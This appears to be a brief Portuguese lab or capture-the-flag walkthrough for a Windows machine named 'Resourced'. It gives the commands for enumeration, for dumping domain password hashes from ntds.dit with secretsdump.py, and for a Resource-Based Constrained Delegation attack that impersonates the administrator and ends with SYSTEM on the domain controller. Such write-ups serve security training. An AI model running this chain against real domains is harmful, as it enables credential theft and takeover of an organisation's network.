# Resourced
> ntds.dit + SYSTEM + RBCD

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
enum4linux-ng -A <IP>
```

Compartilhamento SMB acessível com credenciais encontradas.

## Exploração

Dump do `ntds.dit` via SMB ou serviço exposto:

```
secretsdump.py <user>:<pass>@<IP>
```

Hashes extraídos do `ntds.dit` e arquivo `SYSTEM`.

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## Escalada de Privilégio

Resource-Based Constrained Delegation (RBCD):

```
rbcd.py -f ATTACKER$ -t DC$ -dc-ip <IP> <domain>/<user>:<pass>
getST.py -spn cifs/<DC>.<domain> -impersonate administrator -dc-ip <IP> <domain>/ATTACKER$:<pass>
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass <DC>.<domain>
```

SYSTEM no Domain Controller obtido.
